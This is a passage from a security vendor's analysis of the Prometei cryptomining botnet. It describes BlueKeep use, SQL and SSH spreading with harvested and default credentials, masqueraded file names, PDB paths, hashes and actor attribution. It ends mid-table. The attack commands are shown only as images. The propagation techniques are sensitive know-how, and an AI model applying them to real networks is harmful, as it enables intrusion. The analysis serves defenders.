<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-14.png?width=800&amp;name=prometei-blog-image-14.png" alt="prometei-blog-image-14" width="800" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 800px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-14.png?width=400&amp;name=prometei-blog-image-14.png 400w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-14.png?width=800&amp;name=prometei-blog-image-14.png 800w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-14.png?width=1200&amp;name=prometei-blog-image-14.png 1200w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-14.png?width=1600&amp;name=prometei-blog-image-14.png 1600w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-14.png?width=2000&amp;name=prometei-blog-image-14.png 2000w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-14.png?width=2400&amp;name=prometei-blog-image-14.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Downgrading the SMB protocol to version 1</span></em></p>
<p>To use the RDP exploit BlueKeep, the malware uses another component, Bklocal2.exe / Bklocal4.exe (Depending on the OS version), which is also downloaded by Sqhost and located in C:\Windows\dell:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-15.png?width=526&amp;name=prometei-blog-image-15.png" alt="prometei-blog-image-15" width="526" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 526px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-15.png?width=263&amp;name=prometei-blog-image-15.png 263w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-15.png?width=526&amp;name=prometei-blog-image-15.png 526w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-15.png?width=789&amp;name=prometei-blog-image-15.png 789w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-15.png?width=1052&amp;name=prometei-blog-image-15.png 1052w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-15.png?width=1315&amp;name=prometei-blog-image-15.png 1315w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-15.png?width=1578&amp;name=prometei-blog-image-15.png 1578w" sizes="(max-width: 526px) 100vw, 526px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Executing the BlueKeep exploit binaries</span></em></p>
<h3 style="font-weight: normal; font-size: 36px;"><span style="color: #434343;">Preparing the Ground for Other Components</span></h3>
<p>RdpcIip also prepares the ground for other components of the bot such as Nethelper, the SQL spreader, Windrlver, and the SSH client.</p>
<p>It checks if the dependencies for the files are all set, including <a href="https://github.com/mono/mono"><span>Mono.security.dll</span></a> and <a href="https://www.npgsql.org/"><span>Npgsql.dll</span></a>. If not, it will download and copy the files to the right folder. Eventually, RdpcIip will execute the components as child processes and use them for its main purpose - spreading:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-16.png?width=1043&amp;name=prometei-blog-image-16.png" alt="prometei-blog-image-16" width="1043" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 1043px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-16.png?width=522&amp;name=prometei-blog-image-16.png 522w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-16.png?width=1043&amp;name=prometei-blog-image-16.png 1043w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-16.png?width=1565&amp;name=prometei-blog-image-16.png 1565w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-16.png?width=2086&amp;name=prometei-blog-image-16.png 2086w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-16.png?width=2608&amp;name=prometei-blog-image-16.png 2608w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-16.png?width=3129&amp;name=prometei-blog-image-16.png 3129w" sizes="(max-width: 1043px) 100vw, 1043px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Preparing the ground for Nethelper</span></em></p>
<h3 style="font-size: 36px;"><span style="font-weight: normal;">Nethelper2.exe and Nethelper4.exe</span></h3>
<p>NetHelper is a .NET-based executable that is obfuscated using <a href="https://www.ssware.com/cryptoobfuscator/obfuscator-net.htm"><span>CryptoObfuscator</span></a> protector. The main purpose of this module is to create connections to SQL servers in the network and try to infect them with the main module, Sqhost.</p>
<p>To do so, the malware uses the Npgsql library, a .Net data provider for <a href="https://en.wikipedia.org/wiki/PostgreSQL"><span>PostgreSQL</span></a>, and <a href="https://github.com/mono/mono"><span>Mono</span></a>, a software platform designed to allow developers to easily create cross platform applications. It checks the arguments received which contain the SQL server found in the network and credentials harvested before. The malware then tries to create connection to the server using port 1433 (default for SQL servers) and 5432 (used for PostgreSQL):</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-17.png?width=750&amp;name=prometei-blog-image-17.png" alt="prometei-blog-image-17" width="750" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 750px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-17.png?width=375&amp;name=prometei-blog-image-17.png 375w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-17.png?width=750&amp;name=prometei-blog-image-17.png 750w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-17.png?width=1125&amp;name=prometei-blog-image-17.png 1125w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-17.png?width=1500&amp;name=prometei-blog-image-17.png 1500w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-17.png?width=1875&amp;name=prometei-blog-image-17.png 1875w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-17.png?width=2250&amp;name=prometei-blog-image-17.png 2250w" sizes="(max-width: 750px) 100vw, 750px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Creates connection to SQL server on port 1433</span></em></p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-18.png?width=761&amp;name=prometei-blog-image-18.png" alt="prometei-blog-image-18" width="761" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 761px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-18.png?width=381&amp;name=prometei-blog-image-18.png 381w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-18.png?width=761&amp;name=prometei-blog-image-18.png 761w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-18.png?width=1142&amp;name=prometei-blog-image-18.png 1142w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-18.png?width=1522&amp;name=prometei-blog-image-18.png 1522w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-18.png?width=1903&amp;name=prometei-blog-image-18.png 1903w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-18.png?width=2283&amp;name=prometei-blog-image-18.png 2283w" sizes="(max-width: 761px) 100vw, 761px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Creates connection to PostgreSQL server on port 5432</span></em></p>
<p>If successful, the malware checks the operating system of the SQL server, and operate accordingly:</p>
<ul>
<li aria-level="1">If the OS is Windows - uses PowerShell command to download “zsvc.exe” (Sqhost.exe):</li>
</ul>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-19.png?width=796&amp;name=prometei-blog-image-19.png" alt="prometei-blog-image-19" width="796" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 796px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-19.png?width=398&amp;name=prometei-blog-image-19.png 398w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-19.png?width=796&amp;name=prometei-blog-image-19.png 796w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-19.png?width=1194&amp;name=prometei-blog-image-19.png 1194w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-19.png?width=1592&amp;name=prometei-blog-image-19.png 1592w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-19.png?width=1990&amp;name=prometei-blog-image-19.png 1990w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-19.png?width=2388&amp;name=prometei-blog-image-19.png 2388w" sizes="(max-width: 796px) 100vw, 796px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Downloading Prometei main module on a windows machine using PowerShell</span></em></p>
<ul>
<li aria-level="1">If the OS is Unix based - uses one of the following: Curl / Wget / Nexec:<br><br></li>
</ul>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-20.png?width=931&amp;name=prometei-blog-image-20.png" alt="prometei-blog-image-20" width="931" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 931px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-20.png?width=466&amp;name=prometei-blog-image-20.png 466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-20.png?width=931&amp;name=prometei-blog-image-20.png 931w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-20.png?width=1397&amp;name=prometei-blog-image-20.png 1397w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-20.png?width=1862&amp;name=prometei-blog-image-20.png 1862w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-20.png?width=2328&amp;name=prometei-blog-image-20.png 2328w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-20.png?width=2793&amp;name=prometei-blog-image-20.png 2793w" sizes="(max-width: 931px) 100vw, 931px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Downloading Prometei main module on a Unix based machine using different methods</span></em></p>
<h3 style="font-size: 36px;"><span style="font-weight: normal;">Windrlver.exe</span></h3>
<p>Windlver.exe (with a lowercase “L” and not a capital “i”) is an OpenSSH and SSLib-based software that the attackers have created so they can spread across the network using SSH. Since it’s used for spreading, it is launched by the spreader component RdpcIip, and downloaded as part of the Netwalker.7z archive.&nbsp;</p>
<p>When launched, the remote server is passed as a parameter, and it tries to login to the servers using the stolen credentials and using a predefined list of usernames and passwords (the same list in RdpcIip, since it is the component that executes Windrlver). In addition, it also tries default servers usernames such as: root, admin, user and netup123 (the default user for NetUP servers):</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-21.png?width=891&amp;name=prometei-blog-image-21.png" alt="prometei-blog-image-21" width="891" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 891px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-21.png?width=446&amp;name=prometei-blog-image-21.png 446w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-21.png?width=891&amp;name=prometei-blog-image-21.png 891w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-21.png?width=1337&amp;name=prometei-blog-image-21.png 1337w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-21.png?width=1782&amp;name=prometei-blog-image-21.png 1782w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-21.png?width=2228&amp;name=prometei-blog-image-21.png 2228w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-21.png?width=2673&amp;name=prometei-blog-image-21.png 2673w" sizes="(max-width: 891px) 100vw, 891px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Different usernames used to login to remote servers by Windrlver</span></em></p>
<p>If successful, the bot will try to copy and execute the main bot module Sqhost.exe on the remote server.</p>
<h3 style="text-align: left; font-weight: normal; font-size: 36px;">Infrastructure And Tools</h3>
<p>Prometei, same as other botnets, has a diverse infrastructure designed to ensure the botnet is alive and infected machines stay part of the botnet. Over the years, different Prometei C2 servers were taken down by authorities, and the attackers had to constantly work their way around it. We assess that this is one of the reasons why the main bot contains not just one, but four different C2 servers in the newer versions.</p>
<p>Prometei botnet tries to hide it’s malicious activities by masquerading different components as native OS processes, sometimes using the name of the file as-is. For example, the Sqhost.exe file is sometimes purposely misspelled to make it look like another file,and RdpcIip.exe (with a capital “i” instead of a lowercase “L”) is used in the legitimate OS process name.</p>
<p>Besides keeping the masquerading techniques from its early days, Prometei has also kept a consistent naming convention and URL pattern, which makes tracking its components and infrastructure relatively easy. For example, all the way back to the first version analyzed by Cybereason, the attackers used the same file names, such as:</p>
<ul>
<li aria-level="1"><span style="font-size: 18px;">C:\dell\searchindexer.exe</span></li>
<li aria-level="1"><span style="font-size: 18px;">C:\dell\desktop.dat</span></li>
<li aria-level="1"><span style="font-size: 18px;">C:\Windows\svchost.exe</span><br><span style="font-size: 18px;"></span></li>
</ul>
<p>For a full list of servers, see IOCs list.</p>
<h3 style="font-size: 36px;"><span style="font-weight: normal;">All the Way Back to 2016</span></h3>
<p>As mentioned previously, Prometei was discovered in July 2020, and according to the researcher who discovered it, the botnet was active as early as the beginning of March 2020. Our research reveals that Prometei actually has been around since at least 2016.</p>
<p>Following the infrastructure of the botnet, most of which was taken down by authorities, we were able to find the following:</p>
<ul style="font-size: 18px;">
<li aria-level="1">A Prometei.cgi file that contains the command “ver” (show the bot version), which was found in the wild in May 2016:</li>
</ul>
<p>&nbsp;</p>
<p style="text-align: center; padding-left: 40px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-22.png?width=386&amp;name=prometei-blog-image-22.png" alt="prometei-blog-image-22" width="386" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 386px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-22.png?width=193&amp;name=prometei-blog-image-22.png 193w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-22.png?width=386&amp;name=prometei-blog-image-22.png 386w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-22.png?width=579&amp;name=prometei-blog-image-22.png 579w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-22.png?width=772&amp;name=prometei-blog-image-22.png 772w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-22.png?width=965&amp;name=prometei-blog-image-22.png 965w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-22.png?width=1158&amp;name=prometei-blog-image-22.png 1158w" sizes="(max-width: 386px) 100vw, 386px"></p>
<p style="text-align: center; padding-left: 40px;"><em><span style="color: #5e5f5f;">VT screenshot: SHA-256: </span></em><span style="font-size: 16px;"><em><span style="color: #5e5f5f;">cf542ada135ee3edcbbe7b31003192c75295c7eff0efe7593a0a0b0f792d5256</span></em></span></p>
<ul>
<li aria-level="1">In 2017, the attackers named the main component “download.exe” (later changed to “svchost.exe” and now “qhost.exe”). They also used a certificate to sign the binaries:</li>
</ul>
<p>&nbsp;</p>
<p style="padding-left: 40px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-23.png?width=857&amp;name=prometei-blog-image-23.png" alt="prometei-blog-image-23" width="857" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 857px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-23.png?width=429&amp;name=prometei-blog-image-23.png 429w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-23.png?width=857&amp;name=prometei-blog-image-23.png 857w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-23.png?width=1286&amp;name=prometei-blog-image-23.png 1286w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-23.png?width=1714&amp;name=prometei-blog-image-23.png 1714w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-23.png?width=2143&amp;name=prometei-blog-image-23.png 2143w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-23.png?width=2571&amp;name=prometei-blog-image-23.png 2571w" sizes="(max-width: 857px) 100vw, 857px"></p>
<p style="text-align: center; padding-left: 40px; font-size: 16px;"><em><span style="color: #5e5f5f;">VT screenshot: SHA-256: fdcf4887a2ace73b87d1d906b23862c0510f4719a6c159d1cde48075a987a52f</span></em></p>
<h3 style="font-size: 36px; font-weight: normal;">Every Tool and its Own PDB</h3>
<p>The Prometei Botent evolved over the years by adding new tools and expanding its supported commands. In 2019, it appears that the malware was significantly updated with a lot of tools added in a short period of time. In our analysis we didn’t go over all the tools, since the attackers don’t always use them all, and it can change from one attack to another. Our research revealed a shared PDB pattern used for the tools, that also reveals some information about them, such as purpose and obfuscator used:</p>
<p style="padding-left: 40px;">C:\WORK\Tools_2019\walker\DOTNETPlugin\pgbrute\bin\Release\CryptoObfuscator_Output\nethelper.pdb</p>
<p style="padding-left: 40px;">C:\WORK\Tools_2019\walker\bklocal\BlueKeep\bin\Release\CryptoObfuscator_Output\BlueKeep.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\walker\netwalker\x64\Release\rdpcIip.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\rdpexec\psexec\Release\psexec.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\rdpexec\shift - bot\Release\shift.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\scan_rdp\rdp_checker\MyRDP\SampleRDC\bin\Release\CryptoObfuscator_Output\socks.pdb</p>
<p style="padding-left: 40px;">C:\WORK\Tools_2019\prometei\RDPBrute2016.NET\RDPDetect\bin\Release\CryptoObfuscator_Output\nvsync.pdb</p>
<p style="padding-left: 40px;">C:\WORK\Tools_2019\prometei\nvstub\Release\nvstub.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\nvstub\Release\nvstub.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\scan_rdp\rdp_checker\RDPDetect (rdp_checker)\RDPDetect\bin\Release\CryptoObfuscator_Output\nethost.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\psbrute\Release\psbrute.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\RDPBrute2016.NET\RDPDetect\bin\Release\CryptoObfuscator_Output\nvsync.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\prometei\rdpexec\shift - bot\Release\shift.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\misc\tor_hidden_svc\darkread\x64\Release\darkread.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\misc\util\chk445\Release\chk445.pdb</p>
<p style="padding-left: 40px;">C:\Work\Tools_2019\misc\util\crawler\Release\crawler.pdb</p>
<h3 style="font-size: 36px;"><span style="font-weight: normal;">The Threat Actor</span></h3>
<p>Not much is known about the threat actor behind Prometei. We were able to collect evidence that suggests the threat actors are Russian speaking, and in addition it appears that they attempt to avoid infecting other Russians Speakers. We also can not ignore the name of the bot - “Prometei”, which is the Russian word for Prometheus, the Titan god of fire from the Greek mythology.&nbsp;</p>
<p>In addition, in the older versions of the malware created back in 2016, there were a few samples of “svchost.exe” (the main bot module) that the author of the malware forgot to edit the “product name” and left it in Russian. Also, some of the files have a language code “Russian”:</p>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: none; height: 287px;">
<tbody>
<tr style="height: 234px;">
<td style="border: 1pt solid #000000; height: 234px; width: 386.25px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 10px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-24.png?width=384&amp;name=prometei-blog-image-24.png" alt="prometei-blog-image-24" width="384" loading="lazy" style="width: 384px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-24.png?width=192&amp;name=prometei-blog-image-24.png 192w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-24.png?width=384&amp;name=prometei-blog-image-24.png 384w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-24.png?width=576&amp;name=prometei-blog-image-24.png 576w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-24.png?width=768&amp;name=prometei-blog-image-24.png 768w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-24.png?width=960&amp;name=prometei-blog-image-24.png 960w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-24.png?width=1152&amp;name=prometei-blog-image-24.png 1152w" sizes="(max-width: 384px) 100vw, 384px"></span></p>
</td>
<td style="border: 1pt solid #000000; height: 234px; width: 302.5px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 10px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-25.png?width=301&amp;name=prometei-blog-image-25.png" alt="prometei-blog-image-25" width="301" loading="lazy" style="width: 301px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-25.png?width=151&amp;name=prometei-blog-image-25.png 151w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-25.png?width=301&amp;name=prometei-blog-image-25.png 301w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-25.png?width=452&amp;name=prometei-blog-image-25.png 452w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-25.png?width=602&amp;name=prometei-blog-image-25.png 602w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-25.png?width=753&amp;name=prometei-blog-image-25.png 753w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-25.png?width=903&amp;name=prometei-blog-image-25.png 903w" sizes="(max-width: 301px) 100vw, 301px"></span></p>
</td>
</tr>
<tr style="height: 53px;">
<td style="border: 1pt solid #000000; height: 53px; width: 386.25px; padding: 4px;">
<p style="text-align: center;">Svchost.exe without proper metadata editing</p>
</td>
<td style="border: 1pt solid #000000; height: 53px; width: 302.5px; padding: 4px;">
<p style="text-align: center;">The language code of svchost.exe</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Prometei uses different modules, and not all of them are observed in use in every attack. One of the Prometei components is related to a TOR client installation on the infected machine used to communicate with a TOR C2. As part of the installation, the malware also drops a configuration file (torrc) that is configured to avoid using several exit nodes, all in the Soviet Union:</p>
<p style="text-align: center;"><span style="font-size: 10px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-26.png?width=452&amp;name=prometei-blog-image-26.png" alt="prometei-blog-image-26" width="452" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 452px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-26.png?width=226&amp;name=prometei-blog-image-26.png 226w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-26.png?width=452&amp;name=prometei-blog-image-26.png 452w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-26.png?width=678&amp;name=prometei-blog-image-26.png 678w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-26.png?width=904&amp;name=prometei-blog-image-26.png 904w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-26.png?width=1130&amp;name=prometei-blog-image-26.png 1130w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-26.png?width=1356&amp;name=prometei-blog-image-26.png 1356w" sizes="(max-width: 452px) 100vw, 452px"></span></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Content of torrc file in the installation of the TOR client by Prometei</span></em></p>
<p>In addition, Prometei has another component named nvsync.exe that seems to be an older version of Nethelper, and it contains a function that checks the stolen credentials to avoid certain targets, among them are “Guest” and “Other user” - in Russian: Гость, Другой пользователь:</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-27.png?width=931&amp;name=prometei-blog-image-27.png" alt="prometei-blog-image-27" width="931" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 931px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-27.png?width=466&amp;name=prometei-blog-image-27.png 466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-27.png?width=931&amp;name=prometei-blog-image-27.png 931w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-27.png?width=1397&amp;name=prometei-blog-image-27.png 1397w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-27.png?width=1862&amp;name=prometei-blog-image-27.png 1862w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-27.png?width=2328&amp;name=prometei-blog-image-27.png 2328w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-27.png?width=2793&amp;name=prometei-blog-image-27.png 2793w" sizes="(max-width: 931px) 100vw, 931px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">&nbsp;Function in nvsync.exe - a component of the Prometei bot</span></em></p>
<h3 style="font-weight: normal; font-size: 36px;">Conclusion</h3>
<p>As shown in this report, Prometei is a complex and multistage botnet that, due to its stealthines and wide range of capabilities, puts the compromised network at great risk. The different components work together to enable the malware to perform many tasks: credential harvesting, spreading across the network, establishing C2 communications and more. The malware authors are able to add more modules and expand their capabilities easily, and potentially even shift to another payload objective, more destructive than just mining Monero.</p>
<p>Threat actors in the cybercrime community continue to adopt APT-like techniques and improve efficiency of their operations. As observed in the recent Prometei attacks, the threat actors rode the wave of the recently discovered Microsoft Exchange vulnerabilities and exploited them in order to penetrate targeted networks. We anticipate continued evolution of the advanced techniques being used by different threat actors for different purposes, including cybercrime groups. This puts defenders in a position where they should always be prepared, not only for APT and nation state actors, but also for advanced cybercriminals&nbsp; who try to emulate the big APT groups.</p>
<p>Although the Prometei techniques and some of its components will likely be detected by security analysts, most of them will not be immediately obvious to end-users, which highlights the importance of having a security team and products in place that can detect these malicious operations. This threat poses a great risk for organizations, since the attackers have absolute control over the infected machines, and if they wish so, they can steal information, infect the endpoints with other malware or even collaborate with ransomware gangs by selling the access to the infected endpoints. Lastly, since cryptomining can be resource-hogging, it can affect the performance and stability of critical servers and endpoints, ultimately affecting business continuity.</p>
<p><em>We would like to thank Matt Hart and Niamh O’Connor for their contribution to these investigation efforts.</em></p>
<p style="text-align: center;"><strong>LOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN.</strong></p>
<h3 style="font-size: 36px;"><span style="font-weight: normal;">MITRE ATT&amp;CK BREAKDOWN</span></h3>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: none; width: 1057px;">
<tbody>
<tr>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 115px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Initial Access</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 132px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Execution</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 120px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Persistence</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 136px; padding: 4px;">
